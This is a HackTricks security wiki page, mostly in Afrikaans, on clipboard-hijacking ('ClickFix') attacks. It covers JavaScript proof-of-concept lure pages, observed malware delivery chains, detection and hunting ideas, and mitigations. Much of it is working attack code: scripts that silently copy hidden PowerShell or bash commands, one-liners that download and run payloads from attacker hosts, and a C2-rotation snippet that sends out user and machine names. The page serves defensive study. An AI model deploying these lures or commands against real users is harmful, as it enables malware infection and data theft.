# Clipboard Hijacking (Pastejacking) Aanvalle

{{#include ../../banners/hacktricks-training.md}}

> "Moet nooit iets plak wat jy nie self gekopieer het nie." – ou maar steeds geldige advies

## Oorsig

Clipboard hijacking – ook bekend as *pastejacking* – misbruik die feit dat gebruikers gereeld opdragte kopieer-en-plak sonder om dit na te gaan. 'n Kwaadwillige webblad (of enige JavaScript-bevoegde konteks soos 'n Electron of Desktop toepassing) plaas programmaties deur die aanvaller beheerde teks in die stelsel se clipboard. Slagoffers word aangemoedig, gewoonlik deur noukeurig opgeboude social-engineering instruksies, om **Win + R** (Run dialog), **Win + X** (Quick Access / PowerShell), of 'n terminal te open en die clipboard-inhoud te *paste*, wat onmiddellik arbitraire opdragte uitvoer.

Omdat **geen lêer afgelaai word en geen aanhangsel oopgemaak word nie**, omseil die tegniek die meeste e-pos- en web-inhoud sekuriteitskontroles wat aanhangsels, makros of direkte opdraguitvoering monitor. Die aanval is daarom gewild in phishing-veldtogte wat kommersiële malwarefamilies soos NetSupport RAT, Latrodectus loader of Lumma Stealer lewer.

## Gedwonge kopieer-knoppies en verborge payloads (macOS one-liners)

Sommige macOS infostealers kloon installer-webwerwe (bv. Homebrew) en dwing die gebruik van 'n “Copy” knoppie sodat gebruikers nie net die sigbare teks kan uitlig nie. Die clipboard entry bevat die verwagte installer-opdrag plus 'n aangehegte Base64 payload (bv. `...; echo <b64> | base64 -d | sh`), sodat 'n enkele paste albei uitvoer terwyl die UI die ekstra fase verberg.

## JavaScript Bewys-van-Konsep
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
Ouer veldtogte het `document.execCommand('copy')` gebruik; nuweres vertrou op die asynchrone **Clipboard API** (`navigator.clipboard.writeText`).

## The ClickFix / ClearFake Vloei

1. Gebruiker besoek 'n typosquatted of compromised site (bv. `docusign.sa[.]com`)
2. Ingespotte **ClearFake** JavaScript roep 'n `unsecuredCopyToClipboard()` helper aan wat stilweg 'n Base64-encoded PowerShell one-liner in die clipboard stoor.
3. HTML-instruksies vertel die slagoffer: *“Druk **Win + R**, plak die opdrag en druk Enter om die probleem op te los.”*
4. `powershell.exe` word uitgevoer, laai 'n argief af wat 'n legitieme uitvoerbare lêer plus 'n kwaadwillige DLL bevat (classic DLL sideloading).
5. Die loader ontsleutel addisionele fases, injecteer shellcode en installeer persistence (bv. scheduled task) — uiteindelik hardloop NetSupport RAT / Latrodectus / Lumma Stealer.

### Voorbeeld NetSupport RAT-ketting
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe` (legitieme Java WebStart) deursoek sy gids na `msvcp140.dll`.
* Die kwaadwillige DLL los dinamies APIs op met **GetProcAddress**, laai twee binaries (`data_3.bin`, `data_4.bin`) af via **curl.exe**, ontsleutel hulle met 'n rollende XOR-sleutel `"https://google.com/"`, injecteer die finale shellcode en pak **client32.exe** (NetSupport RAT) uit na `C:\ProgramData\SecurityCheck_v1\`.

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. Laai `la.txt` af met **curl.exe**
2. Voer die JScript downloader binne **cscript.exe** uit
3. Haal 'n MSI payload af → plaas `libcef.dll` langs 'n ondertekende toepassing → DLL sideloading → shellcode → Latrodectus.

### Lumma Stealer via MSHTA
```
mshta https://iplogger.co/xxxx =+\\xxx
```
Die **mshta**-aanroep loods 'n versteekte PowerShell-skrip wat `PartyContinued.exe` haal, `Boat.pst` (CAB) uitpak, `AutoIt3.exe` herbou deur `extrac32` en lêer-samestelling en uiteindelik 'n `.a3x`-skrip uitvoer wat blaaierbewyse na `sumeriavgv.digital` exfiltrates.

## ClickFix: Clipboard → PowerShell → JS eval → Startup LNK with rotating C2 (PureHVNC)

Sommige ClickFix-campagnes slaan lêeraflaaie heeltemal oor en beveel slagoffers aan om 'n one‑liner te plak wat JavaScript via WSH aflaai en uitvoer, dit laat voortbestaan, en die C2 daagliks roteer. Voorbeeld van die waargenome ketting:
```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```
Sleutelkenmerke
- Obfuscated URL omgedraai by runtime om toevallige inspeksie te keer.
- JavaScript hou homself vol via a Startup LNK (WScript/CScript), en kies die C2 volgens die huidige dag – wat vinnige domain rotation moontlik maak.

Minimale JS-fragment wat gebruik word om C2s volgens datum te roteer:
```js
function getURL() {
var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
var current_datetime = new Date().getTime();
var no_days = getDaysDiff(0, current_datetime);
return 'https://'
+ getListElement(C2_domain_list, no_days)
+ '/Y/?t=' + current_datetime
+ '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```
Die volgende fase plaas gewoonlik 'n loader wat persistence vestig en 'n RAT (bv. PureHVNC) aflaai, dikwels TLS aan 'n hardcoded certificate pin en verkeer in stukkies stuur.

Detection ideas specific to this variant
- Process tree: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (or `cscript.exe`).
- Startup artifacts: LNK in `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` wat WScript/CScript oproep met 'n JS-pad onder `%TEMP%`/`%APPDATA%`.
- Registry/RunMRU and command‑line telemetry containing `.split('').reverse().join('')` or `eval(a.responseText)`.
- Repeated `powershell -NoProfile -NonInteractive -Command -` with large stdin payloads to feed long scripts without long command lines.
- Scheduled Tasks that subsequently execute LOLBins such as `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"` under an updater‑looking task/path (e.g., `\GoogleSystem\GoogleUpdater`).

Threat hunting
- Daily‑rotating C2 hostnames and URLs with `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>` pattern.
- Correlate clipboard write events followed by Win+R paste then immediate `powershell.exe` execution.


Blue-teams can combine clipboard, process-creation and registry telemetry to pinpoint pastejacking abuse:

* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` keeps a history of **Win + R** commands – look for unusual Base64 / obfuscated entries.
* Security Event ID **4688** (Process Creation) where `ParentImage` == `explorer.exe` and `NewProcessName` in { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }.
* Event ID **4663** for file creations under `%LocalAppData%\Microsoft\Windows\WinX\` or temporary folders right before the suspicious 4688 event.
* EDR clipboard sensors (if present) – correlate `Clipboard Write` followed immediately by a new PowerShell process.

## IUAM-style verification pages (ClickFix Generator): clipboard copy-to-console + OS-aware payloads

Onlangse veldtogte vervaardig massaal vals CDN/browser verification pages ("Just a moment…", IUAM-style) wat gebruikers dwing om OS-spesifieke opdragte uit hul clipboard in native konsole te kopieer. Dit skuif uitvoering uit die browser sandbox en werk op Windows en macOS.

Belangrike kenmerke van die deur die builder gegenereerde bladsye
- OS-detectie via `navigator.userAgent` om payloads aan te pas (Windows PowerShell/CMD vs. macOS Terminal). Opsionele decoys/no-ops vir unsupported OS om die illusie te handhaaf.
- Outomatiese clipboard-copy by ogenschijnlijk onskadelike UI-aksies (checkbox/Copy) terwyl die sigbare teks dalk verskil van die clipboard-inhoud.
- Mobiele blokkering en 'n popover met stapsgewyse instruksies: Windows → Win+R→paste→Enter; macOS → open Terminal→paste→Enter.
- Opsionele obfuskering en enkellêer-injector om 'n gekompromitteerde site se DOM te oorskryf met 'n Tailwind-styled verification UI (geen nuwe domeinregistrasie benodig nie).

Example: clipboard mismatch + OS-aware branching
```html
<div class="space-y-2">
<label class="inline-flex items-center space-x-2">
<input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
</label>
<div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
// UI shows a harmless string, but clipboard gets the real command
navigator.clipboard.writeText(real).then(()=>{
document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
});
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```
macOS persistence van die eerste uitvoering
- Gebruik `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &` sodat uitvoering voortgaan nadat die terminal gesluit is, wat sigbare artefakte verminder.

In-place page takeover op gekompromitteerde sites
```html
<script>
(async () => {
const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
document.documentElement.innerHTML = html;                 // overwrite DOM
const s = document.createElement('script');
s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
document.head.appendChild(s);
})();
</script>
```
Opsporings- en jagidees spesifiek vir IUAM-styl lures
- Web: Bladsye wat Clipboard API aan verification-widgets bind; wanverhouding tussen vertoonde teks en clipboard-payload; `navigator.userAgent` branching; Tailwind + single-page vervanging in verdagte kontekste.
- Windows endpoint: `explorer.exe` → `powershell.exe`/`cmd.exe` kort ná 'n browser-interaksie; batch/MSI-installasies uitgevoer vanaf `%TEMP%`.
- macOS endpoint: Terminal/iTerm wat `bash`/`curl`/`base64 -d` met `nohup` spawn naby browser-gebeure; agtergrondjobs wat terminal-toemaak oorleef.
- Korreleer `RunMRU` Win+R-geskiedenis en clipboard-skrywings met daaropvolgende console-proses-skepping.

See also for supporting techniques

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## 2026 fake CAPTCHA / ClickFix evolutions (ClearFake, Scarlet Goldfinch)

- ClearFake gaan voort om WordPress-sites te kompromitteer en inject loader JavaScript wat kettings van eksterne gasheerpunte (Cloudflare Workers, GitHub/jsDelivr) en selfs blockchain “etherhiding” aanroepe (bv., POSTs na Binance Smart Chain API-endpunte soos `bsc-testnet.drpc[.]org`) gebruik om die huidige lure-logika te haal. Onlangse overlays gebruik swaar fake CAPTCHAs wat gebruikers aanraai om 'n eenreël (T1204.004) te kopieer/plak in plaas daarvan om iets af te laai.
- Beginuitvoering word toenemend gedelegeer aan gesigneerde script-hosts/LOLBAS. Januarie 2026-kettings het vroeëre gebruik van `mshta` verruil vir die ingeboude `SyncAppvPublishingServer.vbs` wat via `WScript.exe` uitgevoer word, en PowerShell-agtige argumente met aliases/wildcards deurgee om remote inhoud te haal:
```cmd
"C:\WINDOWS\System32\WScript.exe" "C:\WINDOWS\system32\SyncAppvPublishingServer.vbs" "n;&(gal i*x)(&(gcm *stM*) 'cdn.jsdelivr[.]net/gh/grading-chatter-dock73/vigilant-bucket-gui/p1lot')"
```
- `SyncAppvPublishingServer.vbs` is gesigneer en normaalweg deur App-V gebruik; gepaard met `WScript.exe` en ongewone argumente (`gal`/`gcm` aliases, wildcarded cmdlets, jsDelivr URLs) word dit 'n hoë-signaal LOLBAS-fase vir ClearFake.
- Februarie 2026 fake CAPTCHA payloads het teruggeskuif na suiwer PowerShell download cradles. Twee regstreekse voorbeelde:
```powershell
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -c iex(irm 158.94.209[.]33 -UseBasicParsing)
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -w h -c "$w=New-Object -ComObject WinHttp.WinHttpRequest.5.1;$w.Open('GET','https[:]//cdn[.]jsdelivr[.]net/gh/www1day7/msdn/fase32',0);$w.Send();$f=$env:TEMP+'\FVL.ps1';$w.ResponseText>$f;powershell -w h -ep bypass -f $f"
```
- Die eerste ketting is 'in-memory' `iex(irm ...)` grabber; die tweede laai 'n stage via `WinHttp.WinHttpRequest.5.1`, skryf 'n tydelike `.ps1`, en start dit met `-ep bypass` in 'n versteekte venster.

Detection/hunting tips for these variants
- Prosesafkoms: browser → `explorer.exe` → `wscript.exe ...SyncAppvPublishingServer.vbs` or PowerShell cradles onmiddellik na clipboard writes/Win+R.
- Opdragreël-sleutelwoorde: `SyncAppvPublishingServer.vbs`, `WinHttp.WinHttpRequest.5.1`, `-UseBasicParsing`, `%TEMP%\FVL.ps1`, jsDelivr/GitHub/Cloudflare Worker domains, or raw IP `iex(irm ...)` patterns.
- Netwerk: uitgaande verbindings na CDN worker-hosts of blockchain RPC endpunte vanaf script-hosts/PowerShell kort nadat daar geblaai is.
- File/registry: tydelike `.ps1`-skepping onder `%TEMP%` plus RunMRU-inskrywings wat hierdie eenreëlaars bevat; blokkeer/waarsku oor signed-script LOLBAS (WScript/cscript/mshta) wat met eksterne URL's of obfuskeerde alias-stringe uitgevoer word.

## Versagtingsmaatreëls

1. Browser-hardering – deaktiveer clipboard write-access (`dom.events.asyncClipboard.clipboardItem` etc.) of vereis 'n gebruiker-gebaar.
2. Sekuriteitsbewustheid – leer gebruikers om sensitiewe opdragte te *tik* of dit eers in 'n teksredigeerder te plak.
3. PowerShell Constrained Language Mode / Execution Policy + Application Control om ewekansige eenreëlaars te blokkeer.
4. Netwerkbeheer – blokkeer uitgaande versoeke na bekende pastejacking- en malware C2-domeine.

## Verwante Truuks

* **Discord Invite Hijacking** dikwels misbruik dieselfde ClickFix-benadering nadat gebruikers na 'n kwaadwillige bediener gelok is:

{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## Verwysings

- [Fix the Click: Preventing the ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [The ClickFix Factory: First Exposure of IUAM ClickFix Generator](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)
- [2025, the year of the Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [Red Canary – Intelligence Insights: February 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-february-2026/)

{{#include ../../banners/hacktricks-training.md}}
